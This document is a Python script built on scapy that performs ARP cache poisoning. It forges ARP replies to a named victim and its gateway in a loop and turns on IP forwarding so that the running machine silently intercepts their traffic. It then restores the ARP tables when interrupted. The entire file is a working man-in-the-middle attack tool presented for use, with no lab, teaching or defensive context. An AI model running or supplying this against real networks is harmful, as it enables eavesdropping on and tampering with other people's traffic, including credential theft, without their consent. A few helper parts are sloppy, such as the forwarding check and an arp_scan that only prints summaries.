from scapy.all import Ether, ARP, srp, send
import argparse
import time

def enable_ip_forwarding():
    #Enable IP Forwarding
   file_path = "/proc/sys/net/ipv4/ip_forward"
   with open(file_path) as f:
     if f.read() == 1:
      return
   with open(file_path,"w") as f:
      print(1,file=f);

def get_mac(ip):
  #retrive MAC address of the target IP
  ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
  if ans:
   return ans[0][1].src
def spoof(target_ip, host_ip, verbose=True):
 target_mac = get_mac(target_ip)
 arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
 send(arp_response, verbose=0)
 if verbose:
# get the MAC address of the default interface
    self_mac = ARP().hwsrc
    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):

# get the MAC address of target
  target_mac = get_mac(target_ip)
# get the MAC address of spoofed (gateway)
  host_mac = get_mac(host_ip)
#restore
  arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
# sending the restoring packet, 7 times
  send(arp_response, verbose=0, count=7)
  if verbose:
     print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
def arpspoof(target, host, verbose=True):
  enable_ip_forwarding()
  try:
   while True:
    spoof(target, host, verbose)
    spoof(host, target, verbose)
    time.sleep(1)
  except KeyboardInterrupt:
   print("[!] Detected CTRL+C ! restoring the network, please wait...")
   restore(target, host)
   restore(host, target)
def arp_scan(ip):
    request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    print(request.summary())
    print(broadcast.summary())

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP Address to ARP poison")
    parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    target, host, verbose = args.target, args.host, args.verbose
    arpspoof(target, host, verbose)
